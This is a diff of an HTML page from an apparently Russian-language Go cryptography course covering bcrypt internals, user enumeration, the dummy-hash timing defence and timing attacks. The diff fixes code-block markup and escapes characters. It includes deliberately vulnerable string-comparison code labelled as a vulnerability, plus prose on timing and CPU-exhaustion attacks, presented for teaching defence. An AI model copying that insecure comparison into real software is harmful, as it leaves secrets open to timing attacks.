-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">hasher := sha256.New()</p>
-<p style="margin-bottom: 6px;">teeReader := io.TeeReader(resp.Body, hasher)</p>
-<p style="margin-bottom: 6px;">_, err := io.Copy(localFile, teeReader)</p>
-<p style="margin-bottom: 6px;">// hasher.Sum(nil) сравнивается с заголовком ETag или чексуммой</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">hasher := sha256.New()
+teeReader := io.TeeReader(resp.Body, hasher)
+_, err := io.Copy(localFile, teeReader)
+// hasher.Sum(nil) сравнивается с заголовком ETag или чексуммой</code></pre></div>
 <p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">TeeReader</code> одновременно пишет входящие чанки в файл на диске и передает их в <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">hasher.Write</code>. В результате за один проход по сети файл сохраняется на диск и вычисляется его SHA-256 хэш с расходом памяти ровно 32 КБ.</p></div>
   </div>
 </div>
@@ -2645,7 +2639,7 @@ func main() {
 <li style="margin-bottom: 4px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$2a$</code> — версия алгоритма bcrypt.</li>
 <li style="margin-bottom: 4px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">$12$</code> — параметр cost ($2^{12} = 4096$ раундов расширения ключа).</li>
 <li style="margin-bottom: 4px;">Следующие 22 символа (128 бит) — соль в Radix-64.</li>
-<li style="margin-bottom: 4px;">Оставшиеся 31 символ (184 бита) — хэш (зашифрованный текст <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"OrpheanBeholderScryDoubt"</code>).</li>
+<li style="margin-bottom: 4px;">Оставшиеся 31 символ (184 бита) — хэш (зашифрованный текст <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;OrpheanBeholderScryDoubt&quot;</code>).</li>
 </ul></div>
   </div>
   <div style="margin: 18px 0 10px;">
@@ -2755,13 +2749,13 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> Выполняется фаза <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">InitState</code>: создаются P-массив и 4 S-блока шифра Blowfish, заполненные шестнадцатеричными цифрами числа $\pi$.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Вызывается <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ExpandKey(state, salt, password)</code>: алгоритм шифрует нулевой блок и использует результат для непрерывной модификации своих же собственных S-боксов с подмешиванием соли и пароля.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Главный цикл сложности: операция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ExpandKey</code> повторяется ровно $2^{\text{cost}}$ раз (для cost=12 это 4096 раз).</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> После финализации состояния Blowfish 64 раза шифрует известную константную строку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"OrpheanBeholderScryDoubt"</code> (24 байта).</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> После финализации состояния Blowfish 64 раза шифрует известную константную строку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;OrpheanBeholderScryDoubt&quot;</code> (24 байта).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> Полученный шифротекст кодируется кастомным алфавитом Radix-64 (символы <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">./A-Za-z0-9</code>).</div></div>
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Ограничение bcrypt в 72 байта:</strong> Bcrypt молча отсекает все байты пароля после 72-го байта! Пароли <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"VeryLongPassword...111"</code> и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"VeryLongPassword...222"</code>, различающиеся только 73-м символом, дадут абсолютно одинаковый хэш.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование слишком высокого cost (cost > 14):</strong> При cost=14 вычисление одного пароля занимает ~1–2 секунды CPU. Злоумышленник может устроить DoS-атаку на сервер аутентификации, отправив 50 параллельных POST-запросов на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/login</code> и утилизировав 100% процессора.</div></div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Ограничение bcrypt в 72 байта:</strong> Bcrypt молча отсекает все байты пароля после 72-го байта! Пароли <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;VeryLongPassword...111&quot;</code> и <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;VeryLongPassword...222&quot;</code>, различающиеся только 73-м символом, дадут абсолютно одинаковый хэш.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Использование слишком высокого cost (cost &gt; 14):</strong> При cost=14 вычисление одного пароля занимает ~1–2 секунды CPU. Злоумышленник может устроить DoS-атаку на сервер аутентификации, отправив 50 параллельных POST-запросов на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">/login</code> и утилизировав 100% процессора.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -2890,25 +2884,23 @@ func main() {
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Вызывается <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">newFromHash</code>: регулярным парсером извлекаются версия, cost и 16 байт соли.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Инициализируется состояние Eksblowfish с солью из хэша и переданным проверяемым паролем.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> Выполняются те же самые $2^{\text{cost}}$ циклов расширения ключа.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> Зашифровывается константа <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"OrpheanBeholderScryDoubt"</code>.</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">5.</span> Зашифровывается константа <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;OrpheanBeholderScryDoubt&quot;</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">6.</span> Вызывается <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">subtle.ConstantTimeCompare</code> между сгенерированным шифротекстом и шифротекстом из переданного хэша. Если хотя бы один бит отличается, возвращается <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ErrMismatchedHashAndPassword</code>.</div></div>
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Возврат клиенту текста внутренней ошибки bcrypt:</strong> Никогда не возвращайте в HTTP-ответе различия между «Пользователь не найден» и «Неверный пароль» (User Enumeration). Всегда возвращайте единый HTTP 401: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">{"error": "Неверный логин или пароль"}</code>.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Возврат клиенту текста внутренней ошибки bcrypt:</strong> Никогда не возвращайте в HTTP-ответе различия между «Пользователь не найден» и «Неверный пароль» (User Enumeration). Всегда возвращайте единый HTTP 401: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">{&quot;error&quot;: &quot;Неверный логин или пароль&quot;}</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Игнорирование нагрузки на CPU при атаке перебора учетных данных (Credential Stuffing):</strong> Если злоумышленник отправляет 10 000 неверных паролей в секунду, сервер на bcrypt упадет от перегрузки CPU. Обязательно внедряйте Rate Limiting на уровне IP и логина (Redis token bucket).</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
     <div><p style="margin-bottom: 6px;"><strong>Вопрос с собеседования:</strong> Как предотвратить атаку User Enumeration по времени (Timing User Enumeration Attack), если при отсутствии пользователя сервер сразу возвращает 404/401 за 1 мс, а при наличии пользователя выполняет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.CompareHashAndPassword</code> в течение 100 мс?</p>
 <p style="margin-bottom: 6px;"><strong>Ответ:</strong> Злоумышленник по задержке ответа сервера (1 мс против 100 мс) мгновенно определяет, существует ли пользователь в базе данных (утечка списка зарегистрированных пользователей). Решение: если пользователь не найден в БД, сервер обязан выполнить <strong>фиктивное вычисление bcrypt</strong> с константным эталонным хэшем (Dummy Hash):</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">if user == nil {</p>
-<p style="margin-bottom: 6px;">// Выполняем холостой bcrypt, чтобы время ответа было одинаковым (~100 мс)</p>
-<p style="margin-bottom: 6px;">_ = bcrypt.CompareHashAndPassword(dummyHash, []byte(password))</p>
-<p style="margin-bottom: 6px;">return ErrInvalidCredentials</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p></div>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">if user == nil {
+    // Выполняем холостой bcrypt, чтобы время ответа было одинаковым (~100 мс)
+    _ = bcrypt.CompareHashAndPassword(dummyHash, []byte(password))
+    return ErrInvalidCredentials
+}</code></pre></div></div>
   </div>
 </div>
 <div class="exercise-card" id="ex-14">
@@ -2934,7 +2926,7 @@ func main() {
 </ul>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>BLAKE2b (RFC 7693):</strong></div>
 <ul style="margin: 8px 0 8px 20px;">
-<li style="margin-bottom: 4px;">Разработан Жан-Филиппом Омассоном, Neves, Wilcox-O'Hearn и Winnerlein на основе шифра ChaCha20.</li>
+<li style="margin-bottom: 4px;">Разработан Жан-Филиппом Омассоном, Neves, Wilcox-O&#x27;Hearn и Winnerlein на основе шифра ChaCha20.</li>
 <li style="margin-bottom: 4px;"><strong>Один из самых быстрых криптографических хэшей в мире:</strong> на 64-битных процессорах x86-64 / ARM64 он работает быстрее, чем SHA-256, и даже быстрее устаревшего и небезопасного MD5!</li>
 <li style="margin-bottom: 4px;">Включает встроенную поддержку режима с ключом (Keyed Hash / встроенный MAC без оверхеда HMAC).</li>
 <li style="margin-bottom: 4px;">Пакет в Go: <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">golang.org/x/crypto/blake2b</code>.</li>
@@ -3176,23 +3168,21 @@ func main() {
   <div class="callout callout-hood">
     <div class="callout-title">⚙️ Под капотом Go (Compiler, Linker & Runtime)</div>
     <div><p style="margin-bottom: 6px;">Извлечение соли и стоимости внутри пакета bcrypt:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">func newFromHash(hashedSecret []byte) (*hashed, error) {</p>
-<p style="margin-bottom: 6px;">if len(hashedSecret) < minHashSize { // 59 символов</p>
-<p style="margin-bottom: 6px;">return nil, ErrHashTooShort</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;">// Проверяются разделители '$'</p>
-<p style="margin-bottom: 6px;">// Из байтов [4:6] считывается стоимость: cost = atoi(hashedSecret[4:6])</p>
-<p style="margin-bottom: 6px;">// Из байтов [7:29] декодируется 16 байт соли: decode64(salt, hashedSecret[7:29])</p>
-<p style="margin-bottom: 6px;">// Из байтов [29:60] декодируется 24 байта ожидаемого шифротекста</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">func newFromHash(hashedSecret []byte) (*hashed, error) {
+    if len(hashedSecret) &lt; minHashSize { // 59 символов
+        return nil, ErrHashTooShort
+    }
+    // Проверяются разделители &#x27;$&#x27;
+    // Из байтов [4:6] считывается стоимость: cost = atoi(hashedSecret[4:6])
+    // Из байтов [7:29] декодируется 16 байт соли: decode64(salt, hashedSecret[7:29])
+    // Из байтов [29:60] декодируется 24 байта ожидаемого шифротекста
+}</code></pre></div>
 <p style="margin-bottom: 6px;">Благодаря этой архитектуре любая информация о параметрах хранится непосредственно внутри строки хэша, делая хэши полностью переносимыми между серверами, микросервисами и языками программирования (совместимость с Python bcrypt, Java BCrypt, Node.js bcrypt).</p></div>
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
     <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Сравнение хэшей через string == string вместо CompareHashAndPassword:</strong> Самая грубая ошибка новичка — написать <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">HashPassword(input) == hashFromDB</code>. Поскольку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">GenerateFromPassword</code> генерирует новую случайную соль при каждом вызове, это условие <strong>всегда будет ложным</strong> (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">false</code>), и ни один пользователь не сможет войти в систему! Всегда используйте <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">CompareHashAndPassword</code>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Паника при передаче пустого хэша:</strong> Если из базы случайно пришла пустая строка <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">""</code> (NULL в SQL), вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">CheckPassword</code> вернет ошибку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ErrHashTooShort</code>, поэтому проверка на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">len(hashedPassword) == 0</code> полезна для быстрого выхода.</div></div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Паника при передаче пустого хэша:</strong> Если из базы случайно пришла пустая строка <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;&quot;</code> (NULL в SQL), вызов <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">CheckPassword</code> вернет ошибку <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">ErrHashTooShort</code>, поэтому проверка на <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">len(hashedPassword) == 0</code> полезна для быстрого выхода.</div></div>
   </div>
   <div class="callout callout-bigtech">
     <div class="callout-title">🏢 В продакшене BigTech и на собеседованиях</div>
@@ -3454,7 +3444,7 @@ func main() {
 <p style="margin-bottom: 6px;"><strong>Ответ:</strong> Используется паттерн <strong>Transparent Hash Upgrade (Прозрачный апгрейд хэша)</strong>:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> При авторизации сервер считывает хэш из базы данных и вызывает <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cost, _ := bcrypt.Cost([]byte(user.PasswordHash))</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Сервер валидирует введенный пароль через <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bcrypt.CompareHashAndPassword</code>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Если пароль верный, но <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cost < TargetCost</code> (например, $10 < 12$), сервер тут же в этой же горутине генерирует новый хэш с <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cost = 12</code> из уже находящегося в памяти открытого пароля и асинхронно обновляет запись в БД (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">UPDATE users SET password_hash = $1 WHERE id = $2</code>).</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Если пароль верный, но <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cost &lt; TargetCost</code> (например, $10 &lt; 12$), сервер тут же в этой же горутине генерирует новый хэш с <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">cost = 12</code> из уже находящегося в памяти открытого пароля и асинхронно обновляет запись в БД (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">UPDATE users SET password_hash = $1 WHERE id = $2</code>).</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">4.</span> За 3–6 месяцев все активные пользователи незаметно и бесшовно мигрируют на новый уровень безопасности без сброса паролей.</div></div>
   </div>
 </div>
@@ -3472,17 +3462,15 @@ func main() {
     <div><p style="margin-bottom: 6px;">При сравнении секретных данных (API-ключи, HMAC-подписи, токены сессий) стандартный оператор <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">==</code> или функция <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">bytes.Equal</code> несут критическую уязвимость класса <strong>Side-Channel Timing Attack (атака по сторонним каналам на основе замеров времени)</strong>.</p>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Почему обычное сравнение уязвимо:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">func InsecureCompare(a, b []byte) bool {</p>
-<p style="margin-bottom: 6px;">if len(a) != len(b) { return false }</p>
-<p style="margin-bottom: 6px;">for i := 0; i < len(a); i++ {</p>
-<p style="margin-bottom: 6px;">if a[i] != b[i] {</p>
-<p style="margin-bottom: 6px;">return false // <-- Ранний выход! Уязвимость!</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;">return true</p>
-<p style="margin-bottom: 6px;">}</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">func InsecureCompare(a, b []byte) bool {
+    if len(a) != len(b) { return false }
+    for i := 0; i &lt; len(a); i++ {
+        if a[i] != b[i] {
+            return false // &lt;-- Ранний выход! Уязвимость!
+        }
+    }
+    return true
+}</code></pre></div>
 <p style="margin-bottom: 6px;">Если первый байт неверен, функция завершается за 1 итерацию ($\sim 2$ нс). Если верны первые 10 байт, функция выполняет 10 итераций ($\sim 15$ нс).</p>
 <p style="margin-bottom: 6px;">Злоумышленник, отправляя тысячи HTTP-запросов и замеряя распределение сетевых задержек, байт за байтом восстанавливает весь секретный токен или цифровую подпись!</p>
 <div style="height: 8px;"></div>
@@ -3945,7 +3933,7 @@ func main() {
   </div>
   <div class="callout callout-pitfalls">
     <div class="callout-title">⚠️ Частые грабли и ошибки новичков</div>
-    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Игнорирование потоков (Threads > NumCPU):</strong> Если на 2-ядерном сервере указать <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">threads = 8</code>, планировщик Go и ОС будут тратить ресурсы на переключение контекста между 8 потоками, замедляя операцию. Оптимально устанавливать <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">threads</code> не выше реального числа физических ядер контейнера.</div>
+    <div><div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> <strong>Игнорирование потоков (Threads &gt; NumCPU):</strong> Если на 2-ядерном сервере указать <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">threads = 8</code>, планировщик Go и ОС будут тратить ресурсы на переключение контекста между 8 потоками, замедляя операцию. Оптимально устанавливать <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">threads</code> не выше реального числа физических ядер контейнера.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> <strong>Нулевая соль:</strong> Передача пустой или константной соли разрушает уникальность хэшей и делает систему уязвимой к предвычисленным атакам.</div></div>
   </div>
   <div class="callout callout-bigtech">
@@ -3961,7 +3949,7 @@ func main() {
   </div>
   <div class="callout callout-task">
     <div class="callout-title">📌 Условие задачи</div>
-    <div><p style="margin-bottom: 6px;"><strong>[Peppering]</strong>: Реализуй паттерн "Pepper" (перец): перед хэшированием в bcrypt конкатенируй пароль с секретной строкой из переменной окружения (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">PEPPER_SECRET</code>). Объясни, чем pepper отличается от salt (соль уникальна для юзера и хранится в БД, перец один для всех и хранится в коде/KMS).</p></div>
+    <div><p style="margin-bottom: 6px;"><strong>[Peppering]</strong>: Реализуй паттерн &quot;Pepper&quot; (перец): перед хэшированием в bcrypt конкатенируй пароль с секретной строкой из переменной окружения (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">PEPPER_SECRET</code>). Объясни, чем pepper отличается от salt (соль уникальна для юзера и хранится в БД, перец один для всех и хранится в коде/KMS).</p></div>
   </div>
   <div class="callout callout-theory">
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
@@ -4117,18 +4105,16 @@ func main() {
   </div>
   <div class="callout callout-theory">
     <div class="callout-title">💡 Теоретический фундамент и концепция</div>
-    <div><p style="margin-bottom: 6px;">При проектировании защищенных API Gateway и эндпоинтов авторизации вебхуков проверка входящего API-ключа (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Authorization: Bearer <token></code>) или заголовка <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">X-API-Key</code> часто реализуется наивно:</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`go</p>
-<p style="margin-bottom: 6px;">if requestKey == serverSecretKey { ... } // КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</p>
-<p style="margin-bottom: 6px;"><code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;"></code>`</p>
+    <div><p style="margin-bottom: 6px;">При проектировании защищенных API Gateway и эндпоинтов авторизации вебхуков проверка входящего API-ключа (<code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">Authorization: Bearer &lt;token&gt;</code>) или заголовка <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">X-API-Key</code> часто реализуется наивно:</p>
+<div class="code-container" style="margin: 10px 0;"><pre class="language-go"><code class="language-go">if requestKey == serverSecretKey { ... } // КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</code></pre></div>
 <div style="height: 8px;"></div>
 <p style="margin-bottom: 6px;">Анатомия тайминг-атаки на сравнение строк:</p>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">1.</span> В Go оператор <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">string == string</code> компилируется в функцию <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">runtime.memequal</code>.</div>
 <div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">2.</span> Она сначала сравнивает длины строк, а затем выполняет побайтовое сравнение в цикле, завершаясь при <strong>первом же несовпадении байтов</strong>.</div>
-<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Если секретный ключ — <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"secret_token_12345"</code>, то:</div>
+<div style="margin: 6px 0;"><span style="color: #38bdf8; font-weight: 700;">3.</span> Если секретный ключ — <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;secret_token_12345&quot;</code>, то:</div>
 <ul style="margin: 8px 0 8px 20px;">
-<li style="margin-bottom: 4px;">При попытке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"a..."</code> процессор проверит 1-й байт и вернет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">false</code> за 2 такта.</li>
-<li style="margin-bottom: 4px;">При попытке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">"s..."</code> процессор проверит 1-й байт (совпал!), перейдет ко 2-му байту и вернет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">false</code> за 5 тактов.</li>
+<li style="margin-bottom: 4px;">При попытке <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">&quot;a...&quot;</code> процессор проверит 1-й байт и вернет <code style="background: rgba(0, 173, 216, 0.12); color: #38bdf8; padding: 2px 5px; border-radius: 4px; font-size: 0.88em;">false</code> за 2 такта.</li>
